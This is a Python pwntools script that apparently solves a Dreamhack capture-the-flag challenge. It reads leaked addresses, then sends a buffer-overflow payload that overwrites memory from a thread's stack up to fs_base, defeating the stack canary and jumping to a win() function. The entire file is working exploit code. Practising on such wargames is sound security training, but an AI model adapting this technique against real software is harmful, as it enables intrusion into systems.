from pwn import *
import sys
p = remote('host3.dreamhack.games', 10883)

p.recvline()

# 1. get $fs_base, buf, win() address
fs_base = int(p.recvline().decode().split()[1], 16)
print(f'{fs_base = : #x}')
thread_stack_addr = int(p.recvline().decode().split()[1], 16)
print(f'{thread_stack_addr = : #x}')
win_addr = int(p.recvline().decode().split()[1], 16)
print(f'{win_addr = : #x}')

# 2. overwrite from thread stack to $fs_base
payload = b''
payload += b'\x00'*(fs_base - thread_stack_addr - 0x58)
payload += p64(thread_stack_addr)
payload += b'A'*0x50
payload += b'B'*0x10
payload += p64(thread_stack_addr)
payload += b'C'*0x18
payload += p64(win_addr)

p.sendlineafter(b': ', str(len(payload)).encode())
p.sendafter(b': ', payload)

p.interactive()